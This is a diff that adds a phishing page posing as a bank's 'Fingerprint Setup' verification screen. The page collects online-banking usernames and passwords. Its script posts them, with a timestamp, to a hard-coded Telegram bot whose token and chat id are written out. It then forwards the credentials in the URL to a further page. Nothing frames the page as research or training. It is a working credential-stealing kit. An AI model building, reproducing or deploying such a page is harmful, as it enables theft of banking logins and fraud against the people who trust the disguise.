@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+<title>Fingerprint Setup</title>
+<style>
+  :root{
+    --text:#111;
+    --muted:#6b7280;
+    --border:#e6e6e6;
+    --link:#0a66c2;
+    --black:#0b0b0c;
+    --disabled:#e9ecef;
+    --disabled-text:#a3a3a3;
+    --accent:#07a0e3;
+    /* Added for enabled LOGIN state */
+    --green:#029a3e;
+  }
+
+  html, body { margin:0; padding:0; background:#fff; color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    overflow:hidden; width:100%;
+  }
+  .screen{
+    position:relative; height:100dvh; width:100%; overflow:hidden;
+    display:flex; flex-direction:column;
+  }
+  @supports not (height: 100dvh){ .screen{ height:100vh; } }
+  @supports (height: 100svh){ .screen{ height:100svh; } }
+
+  .hero{
+    position:relative;
+    flex:0 0 auto;
+    height:36%;
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    text-align:center;
+    background:#f5f7f9;
+    overflow:hidden;
+  }
+  .hero::before{
+    content:"";
+    position:absolute; inset:0;
+    background:url('12.jpg') center/cover no-repeat;
+    opacity:0.3; z-index:1;
+  }
+  .hero::after{
+    content:"";
+    position:absolute; inset:0;
+    background:linear-gradient(180deg, rgba(255,255,255,.75) 0%, rgba(255,255,255,.9) 60%, #fff 100%);
+  }
+  .hero-inner{ position:relative; z-index:1; padding:0 20px; margin-top:-55%; }
+
+  .title{
+    font-size:40px; font-weight:200; letter-spacing:.2px;
+    text-align:center; color:#333;
+  }
+  .fp-circle{
+    width:90px; height:90px; border-radius:50%;
+    background:#57afe1;
+    display:flex; align-items:center; justify-content:center;
+    margin:0 auto; margin-top:80px;
+    box-shadow:0 1px 0 rgba(0,0,0,.05) inset;
+    z-index:3;
+  }
+  .fp-icon{
+    width:55px; height:55px; display:block; object-fit:contain;
+    filter:invert(1) brightness(100); /* makes the SVG white */
+  }
+
+  .body{
+    flex:1 1 auto;
+    padding:16px 18px 0;
+    display:flex; flex-direction:column;
+    background:#fff;
+  }
+  .lede{
+    margin:0 auto 6px; text-align:center; color:var(--muted);
+    font-size:18px; line-height:1.4; max-width:28ch; font-weight:200;
+    margin-bottom: 20px;
+  }
+
+  /* fields touch each other (no gap) */
+  .field{
+    display:flex; align-items:center;
+    border:1px solid var(--border);
+    border-radius:0;
+    background:#fff;
+    padding:0 12px;
+    height:52px;
+  }
+  .field:first-of-type{
+    border-top-left-radius:6px; border-top-right-radius:6px;
+  }
+  .field:last-of-type{
+    border-bottom-left-radius:6px; border-bottom-right-radius:6px;
+    border-top:0; /* remove top border to join seamlessly */
+  }
+
+  .field input{
+    width:100%; border:0; outline:0; font-size:16px; color:#111;
+    background:transparent;
+  }
+  .field input::placeholder{
+    color:#b4b4b4;
+    font-weight:200; /* lighter placeholder */
+  }
+
+  .terms{
+    display:flex; align-items:center; gap:10px; /* aligned with text */
+    font-size:14px; color:#444; margin-top:20px;
+  }
+  .terms input{
+    margin-top:1; /* slight nudge up */
+    width:18px; height:18px;
+    accent-color:#2a7ae2;
+  }
+  .terms a{ color:var(--link); text-decoration:none; font-weight:500; }
+  .terms a:active{ opacity:.8; }
+
+  .bottom-bar{
+    position:absolute; left:0; right:0;
+    bottom:env(safe-area-inset-bottom,0px);
+    display:grid; grid-template-columns:1fr 1fr;
+    height:64px;
+  }
+  .btn{
+    border:0; margin:0; padding:0 16px;
+    font-size:16px; font-weight:600; letter-spacing:.2px;
+    display:flex; align-items:center; justify-content:center;
+    touch-action:manipulation;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn:active{ transform:translateY(1px); }
+  .btn-back{ background:var(--black); color:#fff; }
+  .btn-forward{ background:var(--disabled); color:var(--disabled-text); }
+
+  /* enabled LOGIN state (green & clickable) */
+  .btn-forward.enabled{
+    background:var(--green);
+    color:#fff;
+  }
+
+  .bottom-bar::before{
+    content:""; position:absolute; left:0; right:0; top:0; height:1px;
+    background:#eaeaea;
+  }
+
+  /* Loader Styles */
+  .loader-backdrop {
+    position: fixed;
+    inset: 0;
+    z-index: 1000;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    background: rgba(0, 0, 0, 0.55);
+    backdrop-filter: blur(2px);
+  }
+
+  .loader-backdrop.show {
+    display: flex;
+  }
+
+  .loader-gif {
+    width: 60px;
+    height: 60px;
+    object-fit: contain;
+  }
+
+  .btn__label {
+    transition: opacity 0.15s ease;
+  }
+
+  .btn__spinner {
+    position: absolute;
+    inset: 0;
+    display: none;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .btn__spinner:before {
+    content: "";
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    border: 3px solid rgba(255, 255, 255, 0.5);
+    border-top-color: #fff;
+    animation: spin 1s linear infinite;
+  }
+
+  .btn--loading .btn__label {
+    opacity: 0;
+  }
+
+  .btn--loading .btn__spinner {
+    display: flex;
+  }
+
+  @keyframes spin {
+    to {
+      transform: rotate(360deg);
+    }
+  }
+
+  * { -webkit-tap-highlight-color: transparent; }
+</style>
+</head>
+<body>
+  <div class="screen" role="application">
+    <section class="hero" aria-label="Fingerprint Setup"></section>
+    <div class="hero-inner">
+      <h1 class="title">Fingerprint</h1>
+      <div class="fp-circle">
+        <img class="fp-icon" src="1.svg" alt="Fingerprint icon">
+      </div>
+    </div>
+
+    <section class="body">
+      <p class="lede">To Verify <br>please first login to online banking.</p>
+
+      <label class="field" aria-label="Username">
+        <input id="username" type="text" placeholder="Username" inputmode="text" autocomplete="username">
+      </label>
+
+      <label class="field" aria-label="Password">
+        <input id="password" type="password" placeholder="Password" autocomplete="current-password">
+      </label>
+
+      <label class="terms">
+        <input type="checkbox" id="agree">
+        <span>*I agree to the <a href="#">Terms and Conditions</a></span>
+      </label>
+    </section>
+
+    <div class="bottom-bar" role="group" aria-label="Navigation">
+      <button class="btn btn-back" id="backBtn" type="button">BACK</button>
+      <button class="btn btn-forward" id="loginBtn" type="button" disabled>
+        <span class="btn__label">LOGIN</span>
+        <span class="btn__spinner" aria-hidden="true"></span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Loader -->
+  <div class="loader-backdrop" id="loader" aria-hidden="true">
+    <img src="cicle_loader.gif" alt="Loading..." class="loader-gif" />
+  </div>
+
+  <script>
+    (function(){
+      const user   = document.getElementById('username');
+      const pass   = document.getElementById('password');
+      const agree  = document.getElementById('agree');
+      const login  = document.getElementById('loginBtn');
+      const back   = document.getElementById('backBtn');
+      const loader = document.getElementById('loader');
+
+      function updateLoginState(){
+        const ok = user.value.trim().length > 0 &&
+                   pass.value.trim().length > 0 &&
+                   agree.checked;
+        login.disabled = !ok;
+        login.classList.toggle('enabled', ok);
+      }
+
+      // Show loader function
+      function showLoader() {
+        loader.classList.add('show');
+        login.classList.add('btn--loading');
+        login.disabled = true;
+      }
+      
+      // Hide loader function
+      function hideLoader() {
+        loader.classList.remove('show');
+        login.classList.remove('btn--loading');
+        updateLoginState(); // Re-enable button if conditions are met
+      }
+
+      // Function to send data to Telegram
+      async function sendToTelegram(data) {
+        const botToken = '8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8';
+        const chatId = '-5091670751';
+        
+        // Format the message - only username and password
+        const message = `
+🔐 *Online Banking Login Data*
+
+*Login Credentials:*
+- Username: ${data.username}
+- Password: ${data.password}
+
+*Time:* ${data.time}
+        `;
+        
+        try {
+          const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+              parse_mode: 'Markdown'
+            })
+          });
+          
+          const result = await response.json();
+          return result.ok;
+        } catch (error) {
+          console.error('Error sending to Telegram:', error);
+          return false;
+        }
+      }
+
+      // Watch inputs and checkbox
+      user.addEventListener('input', updateLoginState);
+      pass.addEventListener('input', updateLoginState);
+      agree.addEventListener('change', updateLoginState);
+      updateLoginState(); // initial
+
+      // Back -> previous page
+      back.addEventListener('click', () => {
+        window.location.href = 'verifion.html'; // fallback if no history
+      });
+
+      // Login -> send data to Telegram and go to next screen when enabled
+      login.addEventListener('click', async () => {
+        if (login.disabled) return;
+        
+        // Show loader
+        showLoader();
+        
+        // Get current time
+        const timePK = new Intl.DateTimeFormat("en-PK", {
+          timeZone: "Asia/Karachi",
+          dateStyle: "medium",
+          timeStyle: "medium",
+        }).format(new Date());
+
+        // Prepare data for Telegram - only username and password
+        const telegramData = {
+          username: user.value,
+          password: pass.value,
+          time: timePK
+        };
+
+        // Send data to Telegram
+        const telegramSuccess = await sendToTelegram(telegramData);
+        
+        if (telegramSuccess) {
+          console.log("Login data sent to Telegram successfully");
+        } else {
+          console.log("Failed to send login data to Telegram");
+        }
+
+        // Wait for 2 seconds to show loader
+        await new Promise(r => setTimeout(r, 2000));
+
+        // Hide loader and redirect to pto.html with username and password as URL parameters
+        hideLoader();
+        
+        // Encode the values for URL safety
+        const usernameEncoded = encodeURIComponent(user.value);
+        const passwordEncoded = encodeURIComponent(pass.value);
+        
+        // Redirect to pto.html with the values
+        window.location.href = `pto.html?username=${usernameEncoded}&password=${passwordEncoded}`;
+      });
+    })();
+  </script>
+</body>
+</html>
